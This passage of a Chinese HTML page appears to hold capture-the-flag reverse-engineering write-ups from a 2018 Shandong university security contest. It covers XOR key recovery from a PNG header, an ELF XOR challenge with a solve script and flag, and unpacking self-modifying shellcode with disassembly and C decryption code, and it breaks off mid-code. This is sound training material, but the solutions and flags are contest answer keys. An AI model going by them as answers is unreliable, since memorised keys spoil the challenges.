0, 0.04); border-radius: 3px;">getKey</code><span class="Apple-converted-space">&nbsp;</span>和<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">decrypt</code>。接下来分析 native 层方法，按顺序从<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">getKey</code><span class="Apple-converted-space">&nbsp;</span>开始。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415806596546552.png" title="image.png" alt="image.png" width="682" height="641" style="width: 682px; height: 641px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415556564764.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><br style="box-sizing: border-box;"><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">getKey</code><span class="Apple-converted-space">&nbsp;</span>方法将输入内容与固定字符串<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">Welcome_to_sdnisc_2018_By.Zero</code><span class="Apple-converted-space">&nbsp;</span>相同位置上的字符进行异或运算，循环完成后得到变换后的<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">key</code>。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">接下来继续看<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">decrypt</code><span class="Apple-converted-space">&nbsp;</span>方法。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415556716426.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415806894776792.png" title="image.png" alt="image.png" width="727" height="81" style="width: 727px; height: 81px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">从上图中可以看出<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">decrypt</code><span class="Apple-converted-space">&nbsp;</span>方法十分简洁，解密算法只涉及<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">减法</code>和<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">异或</code>。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">整理上述过程中得到的信息，重要的<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">key</code><span class="Apple-converted-space">&nbsp;</span>未知，无法解密图片，但是回顾整个算法流程，结合<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">异或</code>运算的特性，如果有加密前的图片文件内容，就可以还原出<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">key</code>，那问题来了，这个加密前的内容从哪来呢？</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><strong style="box-sizing: border-box;">从细节出发。</strong></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">通过反编译代码中的文件名<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">encrypt_png.dat</code><span class="Apple-converted-space">&nbsp;</span>或者后期给的<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">hint</code><span class="Apple-converted-space">&nbsp;</span>中都可以得知一个相同的信息，dat 文件是由 png 格式加密得来的。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">每种文件格式都有固定的文件结构，通过最开始的分析已经知道输入长度为 16，而这个长度正好在 png 文件格式<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">File header + header chunk</code><span class="Apple-converted-space">&nbsp;</span>的范围内，也就是说加密前的内容现在已经知道了，直接脚本走起。<br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415556906454.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415807317578306.png" title="image.png" alt="image.png" width="714" height="456" style="width: 714px; height: 456px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415556953193.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415807721716550.png" title="image.png" alt="image.png" width="423" height="804" style="width: 423px; height: 804px;"></p><h2 id="toc_78" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.225; font-size: 1.75em; position: relative; padding-bottom: 0.3em; border-bottom: 1px solid rgb(238, 238, 238); caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Reverse - 3</h2><h3 id="toc_79" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">1. file</h3><h4 id="toc_80" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">出题人有个不好的习惯，总喜欢清除回收站，这次在出题的过程中又把文件给删了，你能帮他还原回来吗？<br style="box-sizing: border-box;">flag无标准格式,提交答案请加上flag{}</p><h4 id="toc_81" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><h4 id="toc_82" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">elf文件，拖入IDA反编译，分析算法，如下图：<br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414692112495.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415808216920774.png" title="image.png" alt="image.png" width="575" height="328" style="width: 575px; height: 328px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">其中<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">sttr_home</code>、<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">flllag</code>变量数组的固定值，均可在IDA中找到。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414692442964.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415808485235471.png" title="image.png" alt="image.png" width="668" height="98" style="width: 668px; height: 98px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">那么该题的算法就很简单了<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">k ^ input[k] ^ v11[k]</code>，v11数组是<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">sttr_home</code>变量数组中的16进制转化为10进制，使用python很容易实现转换。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415808773218381.png" title="image.png" alt="image.png" width="717" height="315" style="width: 717px; height: 315px;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414692947756.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">这里说一下为什么，最后输出了16进制，因为题目描述里说让大家帮出题人找丢失的文件，程序中也提到，flag是文件的MD5值，所以我们的python脚本，不是直接就可以跑出来flag的，需要跑出来16进制然后写入文件，得到文件的MD5值作为flag进行提交。<br style="box-sizing: border-box;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15414693230099.jpg" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415809045003660.png" title="image.png" alt="image.png" width="364" height="372" style="width: 364px; height: 372px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">这里也是一个坑点，有些选手看到跑出来了不可见字符，就怀疑算法的正确性。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题脚本如下：</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">strs&nbsp;=&nbsp;[0x66,0x4e,0x6,0x22,0x66,0x25,0x42,0x5d,0x56,0x2e,0x76,0x6e,0x4,0x2d,0x42,0x2c,0x7,0x2c,0x45,0x69,0x2d,0x12,0x5c,0x7e,0x65,0x52,0x60,0x69,0x54,0x64,0x66,0x43]
strss&nbsp;=&nbsp;"flag{hello_player_come_on_hahah}"
for&nbsp;i&nbsp;in&nbsp;range(len(strs)):&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;hex(strs[i]&nbsp;^&nbsp;ord(strss[i])&nbsp;^&nbsp;i),</pre><h4 id="toc_83" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">flag</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">flag{914a7b9df69eab5b74b9edb7070e53e8}</code></p><h3 id="toc_84" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">2.not only smc</h3><h4 id="toc_85" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">所见非所得</p><h4 id="toc_86" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><h4 id="toc_87" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">主程序直接跑shellcode，shellcode里面执行校验，取用户输入的一部分对校验函数解密。穿插了一些花指令，没好意思上vm，最外层只加了一个upx，shellcode里面对upx进行了检测，脱壳之后是不能运行的，直接od里面动态分析，断VirtualAlloc，定位到shellcode smc解密，shellcode部分简单的0x25异或自解密，解密出来在0x10001000处是主要的代码段，取输入的第8位后面的5位来解密校验函数</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">10002DA8&nbsp;&nbsp;&nbsp;/EB&nbsp;0F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;short&nbsp;10002DB9
10002DAA&nbsp;&nbsp;&nbsp;|8B8D&nbsp;1CFFFFFF&nbsp;&nbsp;&nbsp;mov&nbsp;ecx,dword&nbsp;ptr&nbsp;ss:[ebp-0xE4]
10002DB0&nbsp;&nbsp;&nbsp;|83C1&nbsp;01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;ecx,0x1
10002DB3&nbsp;&nbsp;&nbsp;|898D&nbsp;1CFFFFFF&nbsp;&nbsp;&nbsp;mov&nbsp;dword&nbsp;ptr&nbsp;ss:[ebp-0xE4],ecx
10002DB9&nbsp;&nbsp;&nbsp;\8B95&nbsp;1CFFFFFF&nbsp;&nbsp;&nbsp;mov&nbsp;edx,dword&nbsp;ptr&nbsp;ss:[ebp-0xE4]
10002DBF&nbsp;&nbsp;&nbsp;&nbsp;3B55&nbsp;E4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;edx,dword&nbsp;ptr&nbsp;ss:[ebp-0x1C]
10002DC2&nbsp;&nbsp;&nbsp;&nbsp;73&nbsp;2E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnb&nbsp;short&nbsp;10002DF2
10002DC4&nbsp;&nbsp;&nbsp;&nbsp;8B45&nbsp;FC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,dword&nbsp;ptr&nbsp;ss:[ebp-0x4]
10002DC7&nbsp;&nbsp;&nbsp;&nbsp;0385&nbsp;1CFFFFFF&nbsp;&nbsp;&nbsp;add&nbsp;eax,dword&nbsp;ptr&nbsp;ss:[ebp-0xE4]
10002DCD&nbsp;&nbsp;&nbsp;&nbsp;0FB608&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movzx&nbsp;ecx,byte&nbsp;ptr&nbsp;ds:[eax]
10002DD0&nbsp;&nbsp;&nbsp;&nbsp;8B85&nbsp;1CFFFFFF&nbsp;&nbsp;&nbsp;mov&nbsp;eax,dword&nbsp;ptr&nbsp;ss:[ebp-0xE4]
10002DD6&nbsp;&nbsp;&nbsp;&nbsp;99&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cdq10002DD7&nbsp;&nbsp;&nbsp;&nbsp;BE&nbsp;05000000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;esi,0x5
10002DDC&nbsp;&nbsp;&nbsp;&nbsp;F7FE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;idiv&nbsp;esi
10002DDE&nbsp;&nbsp;&nbsp;&nbsp;0FBE5415&nbsp;D8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movsx&nbsp;edx,byte&nbsp;ptr&nbsp;ss:[ebp+edx-0x28]
10002DE3&nbsp;&nbsp;&nbsp;&nbsp;33CA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;ecx,edx
10002DE5&nbsp;&nbsp;&nbsp;&nbsp;8B45&nbsp;FC&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,dword&nbsp;ptr&nbsp;ss:[ebp-0x4]
10002DE8&nbsp;&nbsp;&nbsp;&nbsp;0385&nbsp;1CFFFFFF&nbsp;&nbsp;&nbsp;add&nbsp;eax,dword&nbsp;ptr&nbsp;ss:[ebp-0xE4]
10002DEE&nbsp;&nbsp;&nbsp;&nbsp;8808&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;ds:[eax],cl</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">由于vc下面stdcall的函数头基本固定，可猜出解密函数的key为：<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">jUnk_</code></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解密出这个函数来要分析这个函数，中间穿插了些花指令，带着分析麻烦的话就写脚本去除，特征还是比较明显的。最终得到解密代码如下：</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">void&nbsp;dec_xor2(BYTE&nbsp;*szInput,&nbsp;int&nbsp;nCount){&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(&nbsp;nCount&nbsp;==&nbsp;0&nbsp;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(int&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;nCount;&nbsp;++i&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;szInput[nCount&nbsp;+&nbsp;i]&nbsp;^=&nbsp;szInput[i];
&nbsp;&nbsp;&nbsp;&nbsp;dec_xor2(szInput,&nbsp;nCount&nbsp;&gt;&gt;&nbsp;1);
}

void&nbsp;dec_xor1(BYTE&nbsp;*szInput,&nbsp;int&nbsp;nCount){
&nbsp;&nbsp;&nbsp;&nbsp;dec_xor2(szInput,&nbsp;16);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(nCount)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dec_xor1(szInput,nCount-1);
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;
}

void&nbsp;MakeArray(int&nbsp;nBase,BYTE&nbsp;*pbData,DWORD&nbsp;dwSize){
&nbsp;&nbsp;&nbsp;&nbsp;nBase&nbsp;=&nbsp;nBase*2+10;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;BYTE&nbsp;bArray[50]&nbsp;=&nbsp;{0};&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(int&nbsp;i=0;i&lt;50;i++)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bArray[i]&nbsp;=&nbsp;(nBase*(i+10)-9)%256;
